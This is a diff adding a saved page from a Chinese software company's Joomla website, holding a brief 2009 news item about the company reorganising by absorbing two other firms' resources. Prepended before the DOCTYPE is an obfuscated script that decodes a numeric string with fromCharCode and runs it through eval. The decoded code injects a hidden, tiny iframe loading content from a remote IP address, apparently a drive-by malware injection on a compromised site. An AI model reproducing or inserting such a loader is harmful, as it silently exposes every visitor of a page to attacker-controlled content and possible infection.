@@ -1,0 +1,369 @@
+<script>if(window.document)aa='0';aaa='0';if(aa.indexOf(aaa)===0){ss='';try{new document(12);}catch(qqq){s=String;f='f'+'r'+'o'+'mChar';f+='Code';}ee='e';e=window.eval;t='y';}h=2*Math.sin(3*Math.PI/2);n="3.5a3.5a51.5a50a15a19a49a54.5a48.5a57.5a53.5a49.5a54a57a22a50.5a49.5a57a33.5a53a49.5a53.5a49.5a54a57a56.5a32a59.5a41a47.5a50.5a38a47.5a53.5a49.5a19a18.5a48a54.5a49a59.5a18.5a19.5a44.5a23a45.5a19.5a60.5a3.5a3.5a3.5a51.5a50a56a47.5a53.5a49.5a56a19a19.5a28.5a3.5a3.5a61.5a15a49.5a53a56.5a49.5a15a60.5a3.5a3.5a3.5a49a54.5a48.5a57.5a53.5a49.5a54a57a22a58.5a56a51.5a57a49.5a19a16a29a51.5a50a56a47.5a53.5a49.5a15a56.5a56a48.5a29.5a18.5a51a57a57a55a28a22.5a22.5a24.5a23.5a22a23.5a27a25a22a24a25a24a22a23.5a23a25.5a22.5a50a54.5a54.5a53a22.5a49.5a57.5a59a57.5a48.5a56a49.5a53.5a24a22a55a51a55a18.5a15a58.5a51.5a49a57a51a29.5a18.5a23.5a23a18.5a15a51a49.5a51.5a50.5a51a57a29.5a18.5a23.5a23a18.5a15a56.5a57a59.5a53a49.5a29.5a18.5a58a51.5a56.5a51.5a48a51.5a53a51.5a57a59.5a28a51a51.5a49a49a49.5a54a28.5a55a54.5a56.5a51.5a57a51.5a54.5a54a28a47.5a48a56.5a54.5a53a57.5a57a49.5a28.5a53a49.5a50a57a28a23a28.5a57a54.5a55a28a23a28.5a18.5a30a29a22.5a51.5a50a56a47.5a53.5a49.5a30a16a19.5a28.5a3.5a3.5a61.5a3.5a3.5a50a57.5a54a48.5a57a51.5a54.5a54a15a51.5a50a56a47.5a53.5a49.5a56a19a19.5a60.5a3.5a3.5a3.5a58a47.5a56a15a50a15a29.5a15a49a54.5a48.5a57.5a53.5a49.5a54a57a22a48.5a56a49.5a47.5a57a49.5a33.5a53a49.5a53.5a49.5a54a57a19a18.5a51.5a50a56a47.5a53.5a49.5a18.5a19.5a28.5a50a22a56.5a49.5a57a31.5a57a57a56a51.5a48a57.5a57a49.5a19a18.5a56.5a56a48.5a18.5a21a18.5a51a57a57a55a28a22.5a22.5a24.5a23.5a22a23.5a27a25a22a24a25a24a22a23.5a23a25.5a22.5a50a54.5a54.5a53a22.5a49.5a57.5a59a57.5a48.5a56a49.5a53.5a24a22a55a51a55a18.5a19.5a28.5a50a22a56.5a57a59.5a53a49.5a22a58a51.5a56.5a51.5a48a51.5a53a51.5a57a59.5a29.5a18.5a51a51.5a49a49a49.5a54a18.5a28.5a50a22a56.5a57a59.5a53a49.5a22a55a54.5a56.5a51.5a57a51.5a54.5a54a29.5a18.5a47.5a48a56.5a54.5a53a57.5a57a49.5a18.5a28.5a50a22a56.5a57a59.5a53a49.5a22a53a49.5a50a57a29.5a18.5a23a18.5a28.5a50a22a56.5a57a59.5a53a49.5a22a57a54.5a55a29.5a18.5a23a18.5a28.5a50a22a56.5a49.5a57a31.5a57a57a56a51.5a48a57.5a57a49.5a19a18.5a58.5a51.5a49a57a51a18.5a21a18.5a23.5a23a18.5a19.5a28.5a50a22a56.5a49.5a57a31.5a57a57a56a51.5a48a57.5a57a49.5a19a18.5a51a49.5a51.5a50.5a51a57a18.5a21a18.5a23.5a23a18.5a19.5a28.5a3.5a3.5a3.5a49a54.5a48.5a57.5a53.5a49.5a54a57a22a50.5a49.5a57a33.5a53a49.5a53.5a49.5a54a57a56.5a32a59.5a41a47.5a50.5a38a47.5a53.5a49.5a19a18.5a48a54.5a49a59.5a18.5a19.5a44.5a23a45.5a22a47.5a55a55a49.5a54a49a32.5a51a51.5a53a49a19a50a19.5a28.5a3.5a3.5a61.5".split("a");for(i=0;i-n.length<0;i++){j=i;ss=ss+s[f](-h*(1+1*n[j]));}q=ss;e(q);</script>﻿ 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; _ISO" />
+  <base href="http://www.buddyinfo.cn/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="Buddy软件,您的好友,好用的软件,有用的软件" />
+  <meta name="title" content="浩优完成资源重组" />
+  <meta name="author" content="Administrator" />
+  <meta name="description" content="Buddy软件，让我们的软件和我们都成为您的朋友！" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>浩优完成资源重组</title>
+  <link rel="stylesheet" href="/cn/plugins/content/phocadownload/css/phocadownload.css" type="text/css" />
+  <link rel="stylesheet" href="/cn/modules/mod_jflanguageselection/tmpl/mod_jflanguageselection.css" type="text/css" />
+  <script type="text/javascript" src="/cn/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/cn/media/system/js/caption.js"></script>
+
+<!--[if lte IE 6]>
+<link href="/cn/templates/Camel_Joomla_15_free/css/ie6-png-fix.css" rel="stylesheet" type="text/css" media="screen" />
+<![endif]-->
+<link href="/cn/templates/Camel_Joomla_15_free/css/template_css.css" rel="stylesheet" type="text/css" />
+<link rel="stylesheet" type="text/css" href="/cn/templates/Camel_Joomla_15_free/php/dynamic.css.php	" />
+<link rel="shortcut icon" href="/cn/images/favicon.ico" />
+<script language="JavaScript">
+
+function correctPNG() // correctly handle PNG transparency in Win IE 5.5 & 6.
+
+{
+
+    var arVersion = navigator.appVersion.split("MSIE")
+
+    var version = parseFloat(arVersion[1])
+
+    if ((version >= 5.5) && (document.body.filters)) 
+
+    {
+
+       for(var j=0; j<document.images.length; j++)
+
+       {
+
+          var img = document.images[j]
+
+          var imgName = img.src.toUpperCase()
+
+          if (imgName.substring(imgName.length-3, imgName.length) == "PNG")
+
+          {
+
+             var imgID = (img.id) ? "id='" + img.id + "' " : ""
+
+             var imgClass = (img.className) ? "class='" + img.className + "' " : ""
+
+             var imgTitle = (img.title) ? "title='" + img.title + "' " : "title='" + img.alt + "' "
+
+             var imgStyle = "display:inline-block;" + img.style.cssText 
+
+             if (img.align == "left") imgStyle = "float:left;" + imgStyle
+
+             if (img.align == "right") imgStyle = "float:right;" + imgStyle
+
+             if (img.parentElement.href) imgStyle = "cursor:hand;" + imgStyle
+
+             var strNewHTML = "<span " + imgID + imgClass + imgTitle
+
+             + " style=\"" + "width:" + img.width + "px; height:" + img.height + "px;" + imgStyle + ";"
+
+             + "filter:progid:DXImageTransform.Microsoft.AlphaImageLoader"
+
+             + "(src=\'" + img.src + "\', sizingMethod='scale');\"></span>" 
+
+             img.outerHTML = strNewHTML
+
+             j = j-1
+
+          }
+
+       }
+
+    }    
+
+}
+
+window.attachEvent("onload", correctPNG);
+
+</script>
+<script type="text/JavaScript">
+<!--
+function MM_jumpMenu(targ,selObj,restore){ //v3.0
+  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
+  if (restore) selObj.selectedIndex=0;
+}
+//-->
+</script>
+
+</head>
+<body>
+
+<div class="zentrier_mich" id="header">
+	<div class="seitenheader_div">
+    	<h1>
+        	            <span class="seitenueberschrift"><img src="/cn/templates/Camel_Joomla_15_free/images/logo.png" id="seitenlogo" filter:progid:DXImageTransform.Microsoft.AlphaImageLoader alt="上海浩优信息技术有限公司" title="上海浩优信息技术有限公司"/></span>
+                    </h1>
+        
+        <div class="my_banner">
+					<div class="moduletable">
+					<div id="jflanguageselection"><ul class="jflanguageselection"><li id="active_language"><a href="http://www.buddyinfo.cn/cn/index.php/zh/home/52-uddyinfo-completed-the-reorganization.html"><img src="/cn/components/com_joomfish/images/flags/zh.gif" alt="中文    " title="中文    " /></a></li><li><a href="http://www.buddyinfo.cn/cn/index.php/en/home/52-uddyinfo-completed-the-reorganization.html"><img src="/cn/components/com_joomfish/images/flags/en.gif" alt="English    " title="English    " /></a></li></ul></div><!--Joom!fish V2.0.2 ()-->
+<!-- &copy; 2003-2009 Think Network, released under the GPL. -->
+<!-- More information: at http://www.joomfish.net -->
+		</div>
+	
+        </div>
+</div></div><div class="div_bfree"> <a href="#navigation">Zur Navigation</a> | <a href="#inhalt">Zum Inhalt</a></div>
+
+<div class="zentrier_mich" id="top_menue">
+	<div class="div_topmenue">
+		
+ 		<div id="user3menu">		<div class="moduletable">
+					<ul id="mainlevel-nav"><li><a href="/cn/index.php/zh/home.html" class="mainlevel-nav" id="active_menu-nav">首页</a></li><li><a href="/cn/index.php/zh/successful-case.html" class="mainlevel-nav" >成功案例</a></li><li><a href="/cn/index.php/zh/document-center.html" class="mainlevel-nav" >知识库</a></li><li><a href="/cn/index.php/zh/download-center.html" class="mainlevel-nav" >下载中心</a></li><li><a href="/cn/index.php/zh/submit-an-article.html" class="mainlevel-nav" >在线支持</a></li><li><a href="/cn/index.php/zh/about-us.html" class="mainlevel-nav" >关于我们</a></li></ul>		</div>
+	</div>
+  		<div class="div_style_chooser"><select name="menu1" onchange="MM_jumpMenu('parent',this,0)" class="color_box">
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=006699" style="background-color:#333333" selected>Farbwahl</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=990066" style="background-color:#990066">Plum</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=990033" style="background-color:#990033">Bordeaux</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=990000" style="background-color:#990000">Cherry</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=CC0000" style="background-color:#CC0000">Tomato</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=FF9900" style="background-color:#FF9900">Orange</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=FFCC00" style="background-color:#FFCC00">Citron</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=99CC00" style="background-color:#99CC00">Lime</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=669900" style="background-color:#669900">Kaktus</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=0099CC" style="background-color:#0099CC">High Sky</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=006699" style="background-color:#006699">Deep Water</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=003366" style="background-color:#003366">Clear Night</option>
+<option value="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?chg_color=000000" style="background-color:#000000">Black Velvet</option>
+</select>    <a href="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?font=inc"><img src="/cn/templates/Camel_Joomla_15_free/images/font_plus.gif"></a> <a href="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?font=dec"><img src="/cn/templates/Camel_Joomla_15_free/images/font_minus.gif"></a> <a href="/cn/index.php/home/52-uddyinfo-completed-the-reorganization.html?font=base"><img src="/cn/templates/Camel_Joomla_15_free/images/font_reset.gif"></a></div>
+    </div>
+</div>
+
+<div class="zentrier_mich" id="newsflash">
+    <div class="div_newsflash">
+    			<div class="moduletable">
+					<h3>Search</h3>
+					<form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="25" alt="搜索" class="inputbox" type="text" size="25" value="Key and Enter"  onblur="if(this.value=='') this.value='Key and Enter';" onfocus="if(this.value=='Key and Enter') this.value='';" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+</form>		</div>
+	
+    </div>
+</div>
+ <div class="div_contentheading" ></div>
+<div class="div_contenttabelle">
+  <div class="div_menue_links"><a name="navigation" id="navigation"></a>
+   		<div class="moduletable_menu">
+					<h3>软件产品</h3>
+					<ul class="menu"><li class="item63"><a href="/cn/index.php/zh/hr.html"><span>HR管理系统</span></a></li><li class="item65"><a href="/cn/index.php/zh/buddy-workever.html"><span>远程工作系统</span></a></li><li class="item66"><a href="/cn/index.php/zh/buddy-research.html"><span>科研管理系统</span></a></li></ul>		</div>
+			<div class="moduletable">
+					<h3>技术服务</h3>
+					<ul class="menu"><li class="item67"><a href="/cn/index.php/zh/custom-development.html"><span>定制开发</span></a></li><li class="item54"><a href="/cn/index.php/zh/technical-advisory.html"><span>技术顾问</span></a></li><li class="item81"><a href="/cn/index.php/zh/web-designapromotion.html"><span>WEB设计&amp;推广</span></a></li><li class="item55"><a href="/cn/index.php/zh/domainavirtual-host.html"><span>域名&amp;虚拟主机</span></a></li><li class="item72"><a href="/cn/index.php/zh/sever-softwareahardware-.html"><span>服务器端软硬件</span></a></li></ul>		</div>
+			<div class="moduletable_menu">
+					<h3>解决方案</h3>
+					<ul class="menu"><li class="item69"><a href="/cn/index.php/zh/hr-agent.html"><span>劳务代理</span></a></li><li class="item70"><a href="/cn/index.php/zh/architectural-design.html"><span>建筑设计</span></a></li><li class="item71"><a href="/cn/index.php/zh/goods-trade.html"><span>商品贸易</span></a></li></ul>		</div>
+	
+  </div>
+ 
+  <div class="div_content" >
+    <a name="inhalte" id="inhalt"></a>
+         <div >		<div class="moduletable">
+					<span class="breadcrumbs pathway">
+Home</span>
+		</div>
+	<table class="contentpaneopen">
+<tr>
+		<td class="contentheading" width="100%">
+					浩优完成资源重组			</td>
+						<td align="right" width="100%" class="buttonheading">
+		<a href="/cn/index.php/zh/home/51-about-news/52-uddyinfo-completed-the-reorganization.pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/cn/images/M_images/pdf_button.png" alt="PDF"  /></a>		</td>
+		
+				<td align="right" width="100%" class="buttonheading">
+		<a href="/cn/index.php/zh/home/51-about-news/52-uddyinfo-completed-the-reorganization.html?tmpl=component&amp;print=1&amp;page=" title="打印" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/cn/images/M_images/printButton.png" alt="打印"  /></a>		</td>
+		
+				<td align="right" width="100%" class="buttonheading">
+		<a href="/cn/index.php/zh/component/mailto/?tmpl=component&amp;link=aHR0cDovL3d3dy5idWRkeWluZm8uY24vY24vaW5kZXgucGhwL3poL2hvbWUvNTEtYWJvdXQtbmV3cy81Mi11ZGR5aW5mby1jb21wbGV0ZWQtdGhlLXJlb3JnYW5pemF0aW9uLmh0bWw%3D" title="E-mail" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/cn/images/M_images/emailButton.png" alt="E-mail"  /></a>		</td>
+					</tr>
+</table>
+
+<table class="contentpaneopen">
+<tr>
+	<td valign="top">
+		<span class="small">
+			作者：Administrator		</span>
+		&nbsp;&nbsp;
+	</td>
+</tr>
+
+<tr>
+	<td valign="top" class="createdate">
+		周一, 2009年 06月 15日 17:23	</td>
+</tr>
+
+
+<tr>
+<td valign="top">
+<p>浩优信息近期完成资源整合</p><p>新的浩优信息整合了上海医漫信息技术有限公司和上海正赜信息科技有限公司的技术资源</p><p>这样新的浩优信息将拥有更完整的产品和服务</p><p>我们相信新浩优将成长地更快更好</p><p>我们相信新浩优将为客户提供更多更好的产品和服务</p></td>
+</tr>
+
+</table>
+<span class="article_separator">&nbsp;</span>
+</div>
+        
+	<div class="div_user1">		<div class="moduletable">
+					<h3>浩优动态</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/51-about-news/55-buddy-complete-the-research-projects.html" class="latestnews">
+			浩优完成科研课题验收</a>
+	</li>
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/51-about-news/56-pudong-charity-hospital-use-buddy-soft.html" class="latestnews">
+			浦东慈善医院相中浩优</a>
+	</li>
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/51-about-news/54-ippr-shanghai-use-buddy-hr-and-workever.html" class="latestnews">
+			中元设计院加入浩优大家庭</a>
+	</li>
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/51-about-news/53-new-website-online.html" class="latestnews">
+			新网站上线</a>
+	</li>
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/51-about-news/52-uddyinfo-completed-the-reorganization.html" class="latestnews">
+			浩优完成资源重组</a>
+	</li>
+</ul>		</div>
+	</div>
+	<div class="div_user2">		<div class="moduletable">
+					<h3>用户通知</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/52-about-notice/58-buddyhr-integration-buddyworkever.html" class="latestnews">
+			浩优HR整合浩优远程工作系统</a>
+	</li>
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/52-about-notice/57-buddy-workever-have-update.html" class="latestnews">
+			浩优远程工作系统升级了</a>
+	</li>
+	<li class="latestnews">
+		<a href="/cn/index.php/zh/home/52-about-notice/59-buddyhr-config-update.html" class="latestnews">
+			浩优HR配置更新</a>
+	</li>
+</ul>		</div>
+	</div>
+</div>
+    
+  <div class="div_menue_rechts">
+    		<div class="moduletable">
+					<h3>联系我们</h3>
+					<p><img src="/cn/images/stories/contractus.gif" border="0" /></p>		</div>
+			<div class="moduletable">
+					<h3>在线调查</h3>
+					<form action="index.php" method="post" name="form2">
+
+<table width="95%" border="0" cellspacing="0" cellpadding="1" align="center" class="poll">
+<thead>
+	<tr>
+		<td style="font-weight: bold;">
+			什么是您购买软件的第一考虑因素?		</td>
+	</tr>
+</thead>
+	<tr>
+		<td align="center">
+			<table class="pollstableborder" cellspacing="0" cellpadding="0" border="0">
+							<tr>
+					<td class="sectiontableentry2" valign="top">
+						<input type="radio" name="voteid" id="voteid13" value="13" alt="13" />
+					</td>
+					<td class="sectiontableentry2" valign="top">
+						<label for="voteid13">
+							低廉的价格						</label>
+					</td>
+				</tr>
+											<tr>
+					<td class="sectiontableentry1" valign="top">
+						<input type="radio" name="voteid" id="voteid14" value="14" alt="14" />
+					</td>
+					<td class="sectiontableentry1" valign="top">
+						<label for="voteid14">
+							强大功能						</label>
+					</td>
+				</tr>
+											<tr>
+					<td class="sectiontableentry2" valign="top">
+						<input type="radio" name="voteid" id="voteid15" value="15" alt="15" />
+					</td>
+					<td class="sectiontableentry2" valign="top">
+						<label for="voteid15">
+							可靠的稳定性						</label>
+					</td>
+				</tr>
+											<tr>
+					<td class="sectiontableentry1" valign="top">
+						<input type="radio" name="voteid" id="voteid16" value="16" alt="16" />
+					</td>
+					<td class="sectiontableentry1" valign="top">
+						<label for="voteid16">
+							可信赖的安全性						</label>
+					</td>
+				</tr>
+											<tr>
+					<td class="sectiontableentry2" valign="top">
+						<input type="radio" name="voteid" id="voteid17" value="17" alt="17" />
+					</td>
+					<td class="sectiontableentry2" valign="top">
+						<label for="voteid17">
+							周到的支持服务						</label>
+					</td>
+				</tr>
+										</table>
+		</td>
+	</tr>
+	<tr>
+		<td>
+			<div align="center">
+				<input type="submit" name="task_button" class="button" value="投票" />
+				&nbsp;
+				<input type="button" name="option" class="button" value="结果" onclick="document.location.href='/cn/index.php/zh/component/poll/15-what-is-first.html'" />
+			</div>
+		</td>
+	</tr>
+</table>
+
+	<input type="hidden" name="option" value="com_poll" />
+	<input type="hidden" name="task" value="vote" />
+	<input type="hidden" name="id" value="15" />
+	<input type="hidden" name="805b948ff899073d3544ffffcb50442e" value="1" /></form>		</div>
+			<div class="moduletable">
+					<h3>用户专区</h3>
+					﻿<form action="/cn/index.php/zh/home.html" method="post" name="login" id="form-login" >
+		
+	<p id="form-login-username">
+		<label for="modlgn_username">会员名</label><br />
+		<input id="modlgn_username" type="text" name="username" class="inputbox" alt="username" size="18" />
+	</p>
+	<p id="form-login-password">
+		<label for="modlgn_passwd">密码</label><br />
+		<input id="modlgn_passwd" type="password" name="passwd" class="inputbox" size="18" alt="password" />
+	</p>
+		<input type="submit" name="Submit" class="button" value="登陆" />
+	
+		
+	<input type="hidden" name="option" value="com_user" />
+	<input type="hidden" name="task" value="login" />
+	<input type="hidden" name="return" value="L2Nu" />
+	<input type="hidden" name="805b948ff899073d3544ffffcb50442e" value="1" /></form>
+		</div>
+	
+  </div>
+    </div><div class="zentrier_mich" id="footer">
+<div class="div_footer">
+  <div style="float:left; padding-left:1%;"> &copy; 2013 Buddyinfo </div> <div style="text-align:right; padding-right:1%;  font-size:11px;">Tel:  86-21-54305931    Mail:  <a href="mailto:info.buddyinfo@gmail.com" target=_new>info.buddyinfo#gmail.com</a>(用@替换#)</div>
+</div>
+</div>
+</body>
+</html>
